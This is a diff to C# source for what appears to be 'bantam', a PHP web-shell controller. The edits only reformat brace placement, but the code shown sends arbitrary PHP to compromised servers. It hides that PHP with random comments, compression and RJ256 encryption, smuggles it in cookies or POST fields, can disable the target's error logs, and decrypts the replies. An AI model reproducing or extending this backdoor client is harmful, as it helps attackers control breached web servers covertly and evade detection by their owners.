@@ -37,8 +37,7 @@ namespace bantam.Classes
         /// Shared HttpClient resource to use for all requests
         /// </summary>
         /// 
-        private static HttpClient client = new HttpClient(new HttpClientHandler
-        {
+        private static HttpClient client = new HttpClient(new HttpClientHandler {
             UseCookies = false,
         });
 
@@ -50,8 +49,7 @@ namespace bantam.Classes
             client.CancelPendingRequests();
             client.Dispose();
 
-            client = new HttpClient(new HttpClientHandler
-            {
+            client = new HttpClient(new HttpClientHandler {
                 UseCookies = false,
             });
         }
@@ -66,8 +64,7 @@ namespace bantam.Classes
             client.CancelPendingRequests();
             client.Dispose();
 
-            client = new HttpClient(new HttpClientHandler
-            {
+            client = new HttpClient(new HttpClientHandler {
                 UseProxy = true,
                 UseCookies = false,
                 Proxy = new WebProxy(proxyUrl + ":" + proxyPort, false),
@@ -84,8 +81,7 @@ namespace bantam.Classes
             client.CancelPendingRequests();
             client.Dispose();
 
-            var settings = new ProxySettings
-            {
+            var settings = new ProxySettings {
                 Host = proxyUrl,
                 Port = proxyPort
             };
@@ -102,30 +98,25 @@ namespace bantam.Classes
         /// <returns></returns>
         public static byte[] GzCompress(byte[] input, bool removeHeader = true)
         {
-            using (var result = new MemoryStream())
-            {
+            using (var result = new MemoryStream()) {
                 var lengthBytes = BitConverter.GetBytes(input.Length);
                 result.Write(lengthBytes, 0, 4);
 
-                using (var compressionStream = new GZipStream(result, CompressionMode.Compress))
-                {
+                using (var compressionStream = new GZipStream(result, CompressionMode.Compress)) {
                     compressionStream.Write(input, 0, input.Length);
                     compressionStream.Flush();
                 }
 
                 Byte[] compressedBytes = result.ToArray();
 
-                if (removeHeader)
-                {
+                if (removeHeader) {
                     int headerSize = 14;
 
                     Byte[] bytesWithoutHeader = new Byte[compressedBytes.Length - headerSize];
                     Buffer.BlockCopy(compressedBytes, headerSize, bytesWithoutHeader, 0, bytesWithoutHeader.Length);
 
                     return bytesWithoutHeader;
-                }
-                else
-                {
+                } else {
                     return compressedBytes;
                 }
             }
@@ -138,8 +129,7 @@ namespace bantam.Classes
         /// <returns>string : result</returns>
         public static async Task<string> GetRequest(string url)
         {
-            try
-            {
+            try {
                 HttpMethod method = HttpMethod.Get;
 
                 var request = new HttpRequestMessage(method, url);
@@ -150,12 +140,10 @@ namespace bantam.Classes
 
                 return responseString;
             }
-            catch (System.Net.Http.HttpRequestException e)
-            {
+            catch (System.Net.Http.HttpRequestException e) {
                 LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
             }
-            catch (Exception e)
-            {
+            catch (Exception e) {
                 LogHelper.AddShellLog(url, "Exception caught while executing get request. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
             }
             return string.Empty;
@@ -168,8 +156,7 @@ namespace bantam.Classes
         /// <returns>string result</returns>
         public static async Task<string> PostRequest(string url, Dictionary<string, string> values)
         {
-            try
-            {
+            try {
                 HttpMethod method = HttpMethod.Post;
 
                 var request = new HttpRequestMessage(method, url);
@@ -183,12 +170,10 @@ namespace bantam.Classes
 
                 return responseString;
             }
-            catch (System.Net.Http.HttpRequestException e)
-            {
+            catch (System.Net.Http.HttpRequestException e) {
                 LogHelper.AddShellLog(url, "Exception caught while executing post request. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
             }
-            catch (Exception e)
-            {
+            catch (Exception e) {
                 LogHelper.AddShellLog(url, "Exception caught while executing post request. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
             }
             return string.Empty;
@@ -237,8 +222,7 @@ namespace bantam.Classes
             HttpWebResponse response = (HttpWebResponse)request.GetResponse();
 
             string responseFromServer = "";
-            using (dataStream = response.GetResponseStream())
-            {
+            using (dataStream = response.GetResponseStream()) {
                 StreamReader reader = new StreamReader(dataStream);
                 responseFromServer += reader.ReadToEnd();
             }
@@ -273,26 +257,21 @@ namespace bantam.Classes
             string requestArgsName = BantamMain.Shells[url].RequestArgName;
             string phpCode = PhpBuilder.RandomPHPComment() + phpCodeIn + PhpBuilder.RandomPHPComment();
 
-            if (string.IsNullOrEmpty(phpCode))
-            {
+            if (string.IsNullOrEmpty(phpCode)) {
                 LogHelper.AddShellLog(url, "Attempted to execute empty/null code...", LogHelper.LOG_LEVEL.WARNING);
                 return new ResponseObject(string.Empty, string.Empty, string.Empty);
             }
 
-            try
-            {
-                if (encryptResponse && !disableEncryption)
-                {
+            try {
+                if (encryptResponse && !disableEncryption) {
                     phpCode += PhpBuilder.EncryptPhpVariableAndEcho(ResponseEncryptionMode, ref ResponseEncryptionKey, ref ResponseEncryptionIV);
                 }
 
-                if (Config.DisableErrorLogs)
-                {
+                if (Config.DisableErrorLogs) {
                     phpCode = PhpBuilder.DisableErrorLogging() + phpCode;
                 }
 
-                if (Config.MaxExecutionTime)
-                {
+                if (Config.MaxExecutionTime) {
                     phpCode = PhpBuilder.MaxExecutionTime() + phpCode;
                 }
 
@@ -300,31 +279,24 @@ namespace bantam.Classes
 
                 byte[] phpCodeBytes = Encoding.UTF8.GetBytes(phpCode);
 
-                if (gzipRequestData)
-                {
+                if (gzipRequestData) {
                     phpCodeBytes = GzCompress(phpCodeBytes);
                 }
 
-                if (encryptRequest)
-                {
+                if (encryptRequest) {
                     string encryptionKey = BantamMain.Shells[url].RequestEncryptionKey;
 
-                    if (sendRequestEncryptionIV)
-                    {
+                    if (sendRequestEncryptionIV) {
                         requestEncryptionIV = CryptoHelper.GetRandomEncryptionIV();
                         requestEncryptionIV_VarName = BantamMain.Shells[url].RequestEncryptionIVRequestVarName;
 
                         phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, requestEncryptionIV);
-                    }
-                    else
-                    {
+                    } else {
                         string encryptionIV = BantamMain.Shells[url].RequestEncryptionIV;
 
                         phpCode = CryptoHelper.EncryptBytesToRJ256ToBase64(phpCodeBytes, encryptionKey, encryptionIV);
                     }
-                }
-                else
-                {
+                } else {
                     phpCode = Convert.ToBase64String(phpCodeBytes);
                 }
 
@@ -334,22 +306,17 @@ namespace bantam.Classes
 
                 HttpMethod method;
 
-                if (sendViaCookie)
-                {
+                if (sendViaCookie) {
                     method = HttpMethod.Get;
-                }
-                else
-                {
+                } else {
                     method = HttpMethod.Post;
                 }
 
                 var request = new HttpRequestMessage(method, url);
                 request.Headers.TryAddWithoutValidation("User-Agent", Config.DefaultUserAgent);
 
-                if (sendViaCookie)
-                {
-                    if (phpCode.Length > Config.MaxCookieSizeB)
-                    {
+                if (sendViaCookie) {
+                    if (phpCode.Length > Config.MaxCookieSizeB) {
                         LogHelper.AddShellLog(url, "Attempted to execute a request larger than Max Cookie Size...", LogHelper.LOG_LEVEL.ERROR);
                         return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
@@ -357,30 +324,23 @@ namespace bantam.Classes
                     ////////////////////////////////////////////////////////////////////
                     request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + phpCode);
 
-                    if (encryptRequest && sendRequestEncryptionIV)
-                    {
+                    if (encryptRequest && sendRequestEncryptionIV) {
                         request.Headers.TryAddWithoutValidation("Cookie,", requestEncryptionIV_VarName + "=" + HttpUtility.UrlEncode(requestEncryptionIV));
                     }
                     /////////////////////////////////////////////////////////////////////
 
-                }
-                else
-                {
+                } else {
                     string postArgs = string.Empty;
 
-                    if (encryptRequest && sendRequestEncryptionIV)
-                    {
+                    if (encryptRequest && sendRequestEncryptionIV) {
                         postArgs = string.Format(requestArgsName + "={0}&{1}={2}", phpCode, requestEncryptionIV_VarName, HttpUtility.UrlEncode(requestEncryptionIV));
-                    }
-                    else
-                    {
+                    } else {
                         postArgs = string.Format(requestArgsName + "={0}", phpCode);
                     }
 
                     int maxPostSizeBytes = (Config.MaxPostSizeKib * 1000);
 
-                    if (postArgs.Length > maxPostSizeBytes)
-                    {
+                    if (postArgs.Length > maxPostSizeBytes) {
                         LogHelper.AddShellLog(url, "Attempted to execute request larger than Post Size Max...", LogHelper.LOG_LEVEL.ERROR);
                         return new ResponseObject(string.Empty, string.Empty, string.Empty);
                     }
@@ -391,19 +351,16 @@ namespace bantam.Classes
                 }
 
                 /////////////////////////////////////////////////////////////////////
-                using (HttpResponseMessage response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead))
-                {
+                using (HttpResponseMessage response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead)) {
                     var responseString = await response.Content.ReadAsStringAsync();
                     return new ResponseObject(responseString, ResponseEncryptionKey, ResponseEncryptionIV);
                 }
                 /////////////////////////////////////////////////////////////////////
             }
-            catch (System.Net.Http.HttpRequestException e)
-            {
+            catch (System.Net.Http.HttpRequestException e) {
                 LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
             }
-            catch (Exception e)
-            {
+            catch (Exception e) {
                 LogHelper.AddShellLog(url, "Exception caught while executing php. [" + e.Message + "]", LogHelper.LOG_LEVEL.ERROR);
             }
             return new ResponseObject(string.Empty, string.Empty, string.Empty);
